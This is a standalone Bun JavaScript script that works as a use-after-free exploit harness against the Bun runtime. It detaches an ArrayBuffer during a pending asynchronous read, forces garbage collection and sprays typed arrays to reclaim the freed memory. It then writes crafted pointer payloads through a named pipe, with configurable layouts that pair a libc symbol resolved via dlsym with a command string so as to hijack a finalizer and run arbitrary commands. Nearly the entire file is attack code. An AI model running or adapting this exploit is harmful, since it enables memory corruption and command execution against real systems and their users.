import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { dlopen, ptr, suffix, toArrayBuffer } from "bun:ffi";

const iterations = Number(process.env.ITERATIONS || 64);
const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 8192);
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const sourceFill = Number(process.env.SOURCE_FILL || 0x41);
const targetFill = Number(process.env.TARGET_FILL || 0x71);
const aliasWrite = Number(process.env.ALIAS_WRITE || 0x5a);
const releaseAfterRead = process.env.RELEASE_AFTER_READ === "1";
const pointerOverride = process.env.POINTER_OVERRIDE === undefined ? null : BigInt(process.env.POINTER_OVERRIDE);
const pointerSymbol = process.env.POINTER_SYMBOL || "";
const pointerLibrary = process.env.POINTER_LIBRARY || `libc.${suffix}`;
const targetMode = process.env.TARGET_MODE || "u8";
const targetFinalizerSymbol = process.env.TARGET_FINALIZER_SYMBOL || "";
const targetFinalizerLibrary = process.env.TARGET_FINALIZER_LIBRARY || pointerLibrary;
const detachMode = process.env.DETACH_MODE || "transfer";
const payloadLayout = process.env.PAYLOAD_LAYOUT || "single";
const payloadWordsSpec = process.env.PAYLOAD_WORDS || "";
const command = process.env.COMMAND || "";
const commandBytes = command ? new Uint8Array([...new TextEncoder().encode(command), 0]) : null;
const commandHolder = commandBytes ? new Uint8Array(commandBytes) : null;
const path = join(tmpdir(), `bun-typedarray-vector-alias-ffi-oracle-${process.pid}`);
const retained = [];
const retainedAux = [];
let targetFinalizerPointer = 0n;

if (writeOffset < 0) {
  throw new Error("WRITE_OFFSET must be non-negative");
}

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (detachMode === "clone") {
    structuredClone({}, { transfer: [ab] });
    return;
  }

  if (detachMode === "transfer-same" && typeof ab.transfer === "function") {
    ab.transfer(ab.byteLength);
    return;
  }

  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function hex(value) {
  return `0x${value.toString(16).padStart(16, "0")}`;
}

function writeU64LE(out, offset, value) {
  let v = BigInt(value);
  for (let i = 0; i < 8; i++) {
    out[offset + i] = Number(v & 0xffn);
    v >>= 8n;
  }
}

function parseWord(token, callbackPointer, commandPointer) {
  switch (token) {
    case "callback":
    case "source":
      return callbackPointer;
    case "command":
      return commandPointer;
    case "commandLength":
      return BigInt(commandBytes?.length || 0);
    case "uafSize":
      return BigInt(uafSize);
    case "viewSize":
      return BigInt(viewSize);
    case "zero":
      return 0n;
    case "targetFill":
      return BigInt(targetFill & 0xff);
    case "sourceFill":
      return BigInt(sourceFill & 0xff);
    default:
      return BigInt(token);
  }
}

function pointerPayload(callbackPointer, commandPointer) {
  let words;
  if (payloadWordsSpec) {
    words = payloadWordsSpec.split(",").map(token => parseWord(token.trim(), callbackPointer, commandPointer));
  } else {
    if (payloadLayout === "prefix-callback") {
      const out = Buffer.alloc(24);
      if (!commandBytes?.length) throw new Error("COMMAND is required for PAYLOAD_LAYOUT=prefix-callback");
      if (commandBytes.length > 16) throw new Error("COMMAND must fit before callback field for prefix-callback layout");
      out.set(commandBytes, 0);
      writeU64LE(out, 16, callbackPointer);
      if (writeOffset + out.length > uafSize) {
        throw new Error(`payload length ${out.length} at WRITE_OFFSET ${writeOffset} exceeds UAF_SIZE ${uafSize}`);
      }
      return out;
    }

    const layouts = {
      single: [callbackPointer],
      "callback-command": [callbackPointer, commandPointer],
      "callback-zero-command": [callbackPointer, 0n, commandPointer],
      "callback-command-command": [callbackPointer, commandPointer, commandPointer],
    };
    words = layouts[payloadLayout];
    if (!words) {
      throw new Error(`unknown PAYLOAD_LAYOUT ${JSON.stringify(payloadLayout)}`);
    }
  }

  const out = Buffer.alloc(words.length * 8);
  for (let i = 0; i < words.length; i++) writeU64LE(out, i * 8, words[i]);
  if (writeOffset + out.length > uafSize) {
    throw new Error(`payload length ${out.length} at WRITE_OFFSET ${writeOffset} exceeds UAF_SIZE ${uafSize}`);
  }
  return out;
}

function allocateTargets() {
  retained.length = 0;
  retainedAux.length = 0;

  if (targetMode === "ffi-arraybuffer" && !targetFinalizerPointer) {
    throw new Error("TARGET_FINALIZER_SYMBOL is required for TARGET_MODE=ffi-arraybuffer");
  }

  for (let i = 0; i < sprayCount; i++) {
    let view;
    if (targetMode === "ffi-arraybuffer") {
      const source = new Uint8Array(viewSize);
      if (commandBytes && commandBytes.length <= source.length) {
        source.set(commandBytes, 0);
      } else {
        source.fill((targetFill + (i & 15)) & 0xff);
      }

      const ab = toArrayBuffer(ptr(source), 0, viewSize, targetFinalizerPointer);
      view = new Uint8Array(ab);
      retainedAux.push(source, ab);
    } else {
      view = new Uint8Array(new ArrayBuffer(viewSize));
    }

    if (commandBytes && commandBytes.length <= view.length) {
      view.set(commandBytes, 0);
    } else {
      view.fill((targetFill + (i & 15)) & 0xff);
    }
    retained.push(view);
  }
}

function scan(source) {
  const anomalies = [];
  for (let i = 0; i < retained.length; i++) {
    const expected = (targetFill + (i & 15)) & 0xff;
    let first;
    let last;
    try {
      first = retained[i][0];
      last = retained[i][viewSize - 1];
    } catch (error) {
      anomalies.push({ index: i, error: error?.message || String(error), expected });
      continue;
    }

    if (first !== expected || last !== expected) {
      const beforeSource = source[0];
      let afterSource;
      let wrote = false;
      try {
        retained[i][0] = aliasWrite;
        afterSource = source[0];
        wrote = true;
      } catch (error) {
        anomalies.push({ index: i, first, last, expected, writeError: error?.message || String(error) });
        continue;
      }

      anomalies.push({
        index: i,
        first,
        last,
        expected,
        beforeSource,
        wrote,
        afterSource,
        aliasConfirmed: afterSource === aliasWrite,
      });

      if (afterSource === aliasWrite) break;
    }
  }
  return anomalies;
}

function resolveSymbolPointer(name, library = pointerLibrary) {
  const lib = dlopen(`libc.${suffix}`, {
    dlopen: { args: ["cstring", "int"], returns: "ptr" },
    dlsym: { args: ["ptr", "cstring"], returns: "ptr" },
  });
  const enc = new TextEncoder();
  const libraryName = new Uint8Array([...enc.encode(library), 0]);
  const symbolName = new Uint8Array([...enc.encode(name), 0]);
  const handle = lib.symbols.dlopen(ptr(libraryName), 1);
  if (!handle) throw new Error(`failed to dlopen ${library}`);
  const address = lib.symbols.dlsym(handle, ptr(symbolName));
  if (!address) throw new Error(`failed to resolve ${name} in ${library}`);
  return BigInt(Math.trunc(address));
}

async function runOne(iteration, source, sourcePointer, commandPointer) {
  source[0] = sourceFill;
  source[viewSize - 1] = sourceFill ^ 0xff;
  const payload = pointerPayload(sourcePointer, commandPointer);

  const ab = new ArrayBuffer(uafSize);
  const target = new Uint8Array(ab);
  target.fill(0x51);

  const done = new Promise(resolve => {
    fs.read(fd, target, writeOffset, payload.length, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  detach(ab);
  gcNow();
  allocateTargets();
  gcNow();

  fs.writeSync(fd, payload, 0, payload.length);
  const result = await done;
  const anomalies = commandBytes ? [] : scan(source);
  if (releaseAfterRead) {
    retained.length = 0;
    gcNow();
  }

  const summary = {
    iteration,
    uafSize,
    viewSize,
    sprayCount,
    targetMode,
    detachMode,
    writeOffset,
    payloadLayout,
    payloadWords: payloadWordsSpec || undefined,
    payloadLength: payload.length,
    releaseAfterRead,
    sourcePointer: hex(sourcePointer),
    commandPointer: commandPointer ? hex(commandPointer) : undefined,
    bytesRead: result.bytesRead,
    err: result.err?.message,
    anomalies,
  };
  console.log(JSON.stringify(summary));
  return anomalies.some(item => item.aliasConfirmed);
}

try {
  const source = new Uint8Array(new ArrayBuffer(viewSize));
  source.fill(sourceFill);
  const sourcePointer = pointerOverride ?? (pointerSymbol ? resolveSymbolPointer(pointerSymbol) : BigInt(Math.trunc(ptr(source))));
  const commandPointer = commandHolder ? BigInt(Math.trunc(ptr(commandHolder))) : 0n;
  targetFinalizerPointer = targetFinalizerSymbol ? resolveSymbolPointer(targetFinalizerSymbol, targetFinalizerLibrary) : 0n;

  let successes = 0;
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i, source, sourcePointer, commandPointer)) {
      successes++;
      break;
    }
  }

  console.log(JSON.stringify({
    final: true,
    iterations,
    successes,
    sourceFirst: source[0],
    sourceLast: source[viewSize - 1],
    sourcePointer: hex(sourcePointer),
    commandPointer: commandPointer ? hex(commandPointer) : undefined,
    targetMode,
    detachMode,
    targetFinalizerPointer: targetFinalizerPointer ? hex(targetFinalizerPointer) : undefined,
    targetFinalizerSymbol: targetFinalizerSymbol || undefined,
    targetFinalizerLibrary: targetFinalizerSymbol ? targetFinalizerLibrary : undefined,
    pointerSymbol: pointerSymbol || undefined,
    pointerLibrary: pointerSymbol ? pointerLibrary : undefined,
    payloadLayout,
    payloadWords: payloadWordsSpec || undefined,
    releaseAfterRead,
    command: command || undefined,
  }));
  process.exitCode = successes > 0 ? 86 : 1;
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}
